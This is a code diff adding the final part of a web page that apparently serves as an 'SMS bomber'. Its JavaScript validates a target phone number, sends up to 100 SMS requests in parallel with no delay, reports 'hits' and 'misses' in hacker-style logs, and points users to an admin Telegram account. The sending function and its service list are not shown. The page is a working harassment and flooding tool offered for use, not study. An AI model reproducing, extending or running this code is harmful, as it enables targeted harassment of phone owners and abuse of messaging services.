+            const total = parseInt(countInput.value);
+            
+            // Validation
+            if (!number || number.length !== 11 || !number.startsWith('01')) {
+                addLog("> ERROR: INVALID TARGET NUMBER", "error");
+                addTerminalMessage("> ERROR: INVALID TARGET");
+                return;
+            }
+            
+            if (isNaN(total) || total < 1 || total > 100) {
+                addLog("> ERROR: INVALID PAYLOAD COUNT", "error");
+                addTerminalMessage("> ERROR: INVALID COUNT");
+                return;
+            }
+            
+            // Reset and start
+            isBombing = true;
+            sentCount = 0;
+            successCount = 0;
+            errorCount = 0;
+            totalMessages = total;
+            startTime = Date.now();
+            
+            // UI Updates
+            startBtn.disabled = true;
+            stopBtn.disabled = false;
+            resetBtn.disabled = true;
+            statusText.textContent = "ATTACK IN PROGRESS";
+            statusText.style.color = "#ff0000";
+            updateCounters();
+            updateRemainingCount();
+            
+            // Logs
+            addLog("> INITIATING SMS BOMBING ATTACK", "warning");
+            addLog(`> TARGET: ${number}`, "info");
+            addLog(`> PAYLOAD COUNT: ${total}`, "info");
+            addLog(`> ATTACK SPEED: MAXIMUM (NO DELAY)`, "info");
+            addLog("> =========================================", "info");
+            
+            addTerminalMessage("> INITIATING ATTACK SEQUENCE");
+            addTerminalMessage(`> TARGET: ${number}`);
+            addTerminalMessage(`> PAYLOADS: ${total}`);
+            addTerminalMessage("> MAXIMUM SPEED: NO DELAY");
+            addTerminalMessage("> BEGINNING ATTACK...");
+            
+            // Start timer
+            timerInterval = setInterval(updateTimer, 1000);
+            
+            // Send ALL messages with MAXIMUM SPEED
+            // Using Promise.all for parallel execution
+            const promises = [];
+            
+            for (let i = 0; i < total && isBombing; i++) {
+                sentCount++;
+                updateCounters();
+                updateRemainingCount();
+                
+                // Create promise for each SMS
+                promises.push(
+                    sendSMS(number).catch(() => false)
+                );
+            }
+            
+            // Wait for all promises to complete
+            await Promise.all(promises);
+            
+            // Completion
+            stopBombing();
+            addLog("> =========================================", "info");
+            addLog(`> ATTACK COMPLETED! SUCCESS: ${successCount} | FAILED: ${errorCount}`, "success");
+            addTerminalMessage("> ATTACK SEQUENCE COMPLETE");
+            addTerminalMessage(`> RESULTS: ${successCount} HITS, ${errorCount} MISSES`);
+        }
+        
+        // Stop Bombing
+        function stopBombing() {
+            isBombing = false;
+            startBtn.disabled = false;
+            stopBtn.disabled = true;
+            resetBtn.disabled = false;
+            statusText.textContent = "READY";
+            statusText.style.color = "#00ff00";
+            
+            if (timerInterval) {
+                clearInterval(timerInterval);
+                timerInterval = null;
+            }
+            
+            addLog("> ATTACK ABORTED BY USER", "warning");
+            addTerminalMessage("> ATTACK ABORTED");
+        }
+        
+        // Reset Application
+        function resetApp() {
+            isBombing = false;
+            sentCount = 0;
+            successCount = 0;
+            errorCount = 0;
+            startTime = 0;
+            totalMessages = 0;
+            
+            startBtn.disabled = false;
+            stopBtn.disabled = true;
+            resetBtn.disabled = false;
+            statusText.textContent = "READY";
+            statusText.style.color = "#00ff00";
+            
+            if (timerInterval) {
+                clearInterval(timerInterval);
+                timerInterval = null;
+            }
+            
+            // Reset API status
+            apis.forEach(api => {
+                updateApiStatus(api.id, 'idle');
+            });
+            
+            // Reset UI
+            updateCounters();
+            updateRemainingCount();
+            timeElapsedEl.textContent = "0s";
+            progressBar.style.width = "0%";
+            progressText.textContent = "0%";
+            remainingCountEl.textContent = parseInt(countInput.value) || 10;
+            
+            // Clear logs but keep first few
+            const logsToKeep = 4;
+            const logs = logsContainer.querySelectorAll('.log');
+            if (logs.length > logsToKeep) {
+                for (let i = logsToKeep; i < logs.length; i++) {
+                    logsContainer.removeChild(logs[i]);
+                }
+            }
+            
+            addLog("> SYSTEM RESET COMPLETE", "info");
+            addLog("> READY FOR NEW OPERATION", "info");
+            addTerminalMessage("> SYSTEM RESET");
+            addTerminalMessage("> READY FOR NEW TARGET");
+        }
+        
+        // Telegram Button Click - FIXED
+        telegramBtn.addEventListener('click', function() {
+            const adminUsername = "all_in_one_63";
+            // Direct Telegram URL format
+            const telegramUrl = `https://t.me/${adminUsername}`;
+            
+            addLog(`> CONTACTING ADMIN: @${adminUsername}`, "info");
+            addTerminalMessage(`> OPENING ADMIN CHAT: @${adminUsername}`);
+            
+            // Open Telegram in new tab
+            window.open(telegramUrl, '_blank');
+            
+            // Fallback notification
+            setTimeout(() => {
+                addLog("> IF TELEGRAM DIDN'T OPEN, MANUALLY GO TO: t.me/all_in_one_63", "info");
+            }, 1000);
+        });
+        
+        // Alternative Telegram opening method
+        function openTelegram() {
+            const adminUsername = "all_in_one_63";
+            
+            // Try multiple methods to open Telegram
+            const urls = [
+                `https://t.me/${adminUsername}`,
+                `tg://resolve?domain=${adminUsername}`,
+                `https://telegram.me/${adminUsername}`
+            ];
+            
+            let opened = false;
+            
+            for (let url of urls) {
+                try {
+                    window.open(url, '_blank');
+                    opened = true;
+                    break;
+                } catch (e) {
+                    console.log(`Failed to open: ${url}`);
+                }
+            }
+            
+            if (!opened) {
+                // Last resort - show link
+                alert(`Please manually visit: t.me/${adminUsername}`);
+            }
+        }
+        
+        // ============================================
+        // EVENT LISTENERS
+        // ============================================
+        startBtn.addEventListener('click', startBombing);
+        stopBtn.addEventListener('click', stopBombing);
+        resetBtn.addEventListener('click', resetApp);
+        
+        // Enter key to start bombing
+        document.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter' && !startBtn.disabled) {
+                startBombing();
+            }
+        });
+        
+        // Telegram button - use the fixed function
+        telegramBtn.addEventListener('click', openTelegram);
+        
+        // Initialize on load
+        window.addEventListener('DOMContentLoaded', init);
+    </script>
+</body>
+</html>
